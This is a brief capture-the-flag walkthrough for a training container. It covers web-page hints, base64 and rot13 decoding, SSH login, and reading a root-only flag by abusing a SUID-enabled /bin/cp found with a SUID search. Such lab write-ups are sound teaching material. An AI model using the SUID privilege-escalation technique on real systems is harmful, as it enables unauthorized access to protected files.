Walkthrough (spoilers)


1) Use a browser to view webpage - contains a hint, answer is the the password (aspen)
	http://<hostip>:8080

2) Inspect page source for hidden element, contains base64 encoded string
decode to reveal username of lloyd and that ssh is accessible via port 2222
	echo <string> | base64 -d

3) SSH to container with discovered credentials

4) flag1.txt in user's home directory tells how to decode string in 2nd flag

5) F1@g2.txt located in /usr/games.  Contains a hint and an encoded url pointing to GTFObins
	alias unrot13="tr 'N-ZA-Mn-za-m5-90-4' 'A-Za-z0-9'"
	echo <string> | unrot13

6) flag3.txt is located in /root but permissions have been stripped.  Search for binaries that 
   have the SUID bit set.  In this case /bin/cp will enable us to read the file.

	find / -perm /4000 (or just ls -al /bin)

	LFILE=file_to_read
	cp "$LFILE" /dev/stdout
